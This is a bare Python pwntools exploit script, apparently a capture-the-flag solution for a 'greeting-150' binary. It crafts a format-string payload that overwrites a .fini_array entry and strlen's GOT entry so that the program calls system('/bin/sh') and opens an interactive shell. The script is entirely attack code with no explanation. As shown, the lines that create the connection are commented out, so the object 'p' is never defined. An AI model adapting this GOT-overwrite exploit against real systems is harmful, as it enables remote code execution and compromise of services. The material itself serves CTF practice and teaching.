from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
# binary = "./greeting-150"
# libc_binary = "./"

# p = process(argv=[binary])
# p = remote("220.249.52.133",54557)

# elf = ELF(binary)
# libc = ELF(libc_binary)

fini_addr = 0x8049934 # -> 0x80485a0
main_addr = 0x80485ED
strlen_got = 0x8049A54  #-> 0xf7dd6520
system_got = 0x8048490

context.arch = "i386"
payload = flat([
    fini_addr,strlen_got+2,strlen_got,
    "%{}c%12$hhn%{}c%13$hn%{}c%14$hn".format(0xed-2-18-12,0x804-0xed,0x8490-0x804)
])

p.sendlineafter("Please tell me your name... ","aa"+payload)
p.sendlineafter("Please tell me your name... ","/bin/sh")
p.interactive()

